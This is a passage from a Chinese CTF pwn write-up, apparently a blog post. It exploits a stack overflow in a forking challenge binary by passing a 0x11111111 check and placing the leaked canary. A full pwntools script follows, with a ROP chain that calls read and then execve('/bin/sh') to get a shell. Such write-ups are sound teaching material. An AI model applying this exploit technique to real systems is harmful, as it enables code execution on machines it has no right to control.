+<p>看到已经成功了，这里我们考虑让他派生的子线程跳出循环，和跳出最初的输入名字那里的<code>cmp 0x1</code>一样，往下走有个<code>cmp 0x11111111</code>，过去就可以跳出.</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-41.png" alt="web1"></p>
+<p>看一下它比对的位置</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-42.png" alt="web1"></p>
+<p>看了下其实就是第一个输入时候的头8字节，只要头8个字节的’A’替换为<code>0x11111111</code></p>
+<p>就可以跳出让其成功<code>ret</code></p>
+<p>那我们现在拿到了两个可利用的条件，让我们思考一下怎么实现栈溢出</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.首先我们在第一轮输入`&quot;0x70&quot;`个`&#x27;A&#x27;`或者别的字符,让其派生的子进程中的read可以溢出</span><br><span class="line"></span><br><span class="line">2.在派生的子线程中进行写入，但是要能跳出`0x1111111`的检测才可以ret</span><br></pre></td></tr></table></figure>
+
+<p>我们来看下派生的子进程中的<code>cmp 0x1111111</code>,这里我们需要用第一轮覆盖同样<code>0x100</code>的方式，让第二次xmm2来让其覆盖到这里。</p>
+<p>我在派生的子进程中用<code>0x22222222</code>来填充</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-44.png" alt="web1"></p>
+<p>可以看到这里正好在这次<code>2</code>的填充之前，那也就知道了，需要用之后的xmm2来覆盖这里</p>
+<p><em>淦啦这里因为gdb又崩了所以地址都对不上了，这里rdi指向的xmm2最初写向的地址<code>0x7ffdce429f58</code></em></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-43.png" alt="web1"></p>
+<p>被派生的子进程，<code>0x41414141</code>那就是检测<code>0x11111111</code>的位置</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-46.png" alt="web1"></p>
+<p>距离<code>100</code>也就是<code>0x64</code></p>
+<p>payload修改为</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-45.png" alt="web1"></p>
+<p>在看派生的进程过了xmm2这里的堆栈</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-47.png" alt="web1"></p>
+<p>成功被修改为<code>0x11111111</code>！</p>
+<p>这样在派生的子进程-》再派生的子进程-》派生的子进程,因为共用一个堆栈，导致就成功过了<code>cmp 0x11111111</code></p>
+<p>我们试一下</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-48.png" alt="web1"></p>
+<p>成功嘞</p>
+<p>再看下$rbp的地址距离</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-49.png" alt="web1"></p>
+<p>再重写payload，再执行</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-51.png" alt="web1"></p>
+<p>然后这里我用<code>0x44444444</code>来做标记</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-50.png" alt="web1"></p>
+<p>我本以为这里往下走走就结束了准备直接execve一条龙了，结果他到<code>ret</code>之前又call了个函数，直接给我进程扬了</p>
+<p>进来之后是这样的，是个检测的样子，我懒得分析了..所以采用肉眼观察法（</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-52.png" alt="web1"></p>
+<p>结合它一开始给我们的gift，那这应该是canary的检测，我们需要清理一下填充，在最后一个溢出的进程这里重新看一下canaray的位置</p>
+<p>这里他给我的是<code>0x427ac53c87d9d800</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-56.png" alt="web1"></p>
+<p>他在最后溢出的进程栈的这个位置，就是canary</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-57.png" alt="web1"></p>
+<p>这里覆盖的话我一开始准备用上一个进程的xmm2来覆盖<code>rbp-0x8</code>，不过我发现他好像有数量限制</p>
+<p>为了验证我修改了payload，来做区分</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-58.png" alt="web1"></p>
+<p>然后再走到最后的线程看覆盖情况，发现xmm2挪过去（红框）的空间其实只有<code>256</code></p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-59.png" alt="web1"></p>
+<p>那我们溢出的部分就还是老老实实用read写入的来算偏移</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-61.png" alt="web1"></p>
+<p>偏移<code>152</code>也就是<code>0x98</code></p>
+<p>改一下payload</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-64.png" alt="web1"></p>
+<p><code>rbp</code>和<code>rbp+0x8</code>加俩占位</p>
+<p>可以看到<code>canary</code>成啦</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-62.png" alt="web1"></p>
+<p><code>rbp</code>也ok了</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/image-63.png" alt="web1"></p>
+<p>这样就可以直接打execve了 syscall_read + syscall_execve取值一把嗦！</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh = gdb.debug(&quot;./pwn&quot;,&quot;set follow-fork-mode child\n set detach-on-fork off \n b *0x401A30 \n b *0x401995 \n b *0x4018D4 \n c&quot;)</span></span><br><span class="line"><span class="comment">#sh = gdb.debug(&quot;./pwn&quot;,&quot;set follow-fork-mode child\n set detach-on-fork off \n b *0x4019ED\n b *0x4019b0&quot;)</span></span><br><span class="line"><span class="comment">#sh = gdb.debug(&quot;./pwn&quot;,&quot;b *0x4019b0&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line"></span><br><span class="line">canary_value = <span class="built_in">int</span>(sh.recvline(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">rop_pop_rdi = <span class="number">0x40213f</span></span><br><span class="line">rop_pop_rsi = <span class="number">0x40a1ae</span></span><br><span class="line">rop_pop_rdx_rbx = <span class="number">0x485feb</span></span><br><span class="line">rop_pop_rax = <span class="number">0x450277</span></span><br><span class="line">rop_syscall = <span class="number">0x41AC26</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&quot;leave your name&quot;</span>,p64(<span class="number">1</span>)*<span class="number">8</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;Wanna return?&quot;</span>,<span class="string">&quot;B&quot;</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;once again?&quot;</span>,<span class="string">b&quot;A&quot;</span>*<span class="number">0x70</span>)</span><br><span class="line">sh.sendafter(<span class="string">&quot;once again?&quot;</span>,<span class="string">b&#x27;P&#x27;</span> * <span class="number">0x64</span> + p32(<span class="number">0x11111111</span>) + <span class="string">b&#x27;L&#x27;</span>* <span class="number">0x98</span> + p64(canary_value) + p64(canary_value) + p64(<span class="number">0xbadaabad</span>) + </span><br><span class="line">             p64(rop_pop_rdi) + p64(<span class="number">0</span>) + p64(rop_pop_rsi) + p64(<span class="number">0x4c5000</span>) + p64(rop_pop_rdx_rbx) + p64(<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(rop_pop_rax) + p64(<span class="number">0</span>) + p64(rop_syscall) </span><br><span class="line">             +</span><br><span class="line">             p64(rop_pop_rdi) + p64(<span class="number">0x4c5000</span>) + p64(rop_pop_rsi) + p64(<span class="number">0</span>) + p64(rop_pop_rdx_rbx) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(rop_pop_rax) + p64(<span class="number">0x3b</span>) + p64(rop_syscall))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">sh.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>整个流程</p>
+<p><img src="/wpimages/2024/pwn/2024-wd-xw-pwn2/top.jpg" alt="web1"></p>
+
+        
+      </div>
+
+         
+    </div>
+    
+     
+  </div>
+  
+    
+<nav id="article-nav">
+  <a class="article-nav-btn left  disabled "
+     >
+    <i class="fa-solid fa-angle-left"></i>
+    <p class="title-text">
+        
+    </p>
+  </a>
+  <a class="article-nav-btn right "
+    
+      href="/2024/10/19/cc1-q/"
+      title="cc-一些容易混淆的点"
+     >
+
+    <p class="title-text">
+      
+        cc-一些容易混淆的点
+        
+    </p>
+    <i class="fa-solid fa-angle-right"></i>
+  </a>
+</nav>
+
+
+  
+</article>
+
+
+
+
+
+    </div>
+    <div id="footer-wrapper">
+      <footer id="footer">
+  
+  <div id="footer-info" class="inner">
+    
+    &copy; 2024 Flower<br>
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
+  </div>
+</footer>
+
+    </div>
+    <div class="back-to-top-wrapper">
+    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
+        <i class="fa-solid fa-angle-up"></i>
+    </button>
+</div>
+
+<script>
+    function topFunction() {
+        window.scroll({ top: 0, behavior: 'smooth' });
+    }
+    let btn = document.getElementById('back-to-top-btn');
+    function scrollFunction() {
+        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
+            btn.classList.remove('hide')
+        } else {
+            btn.classList.add('hide')
+        }
+    }
+    window.onscroll = function() {
+        scrollFunction();
+    }
+</script>
+
+  </div>
+  <script src="/js/light-dark-switch.js"></script>
+</body>
+</html>
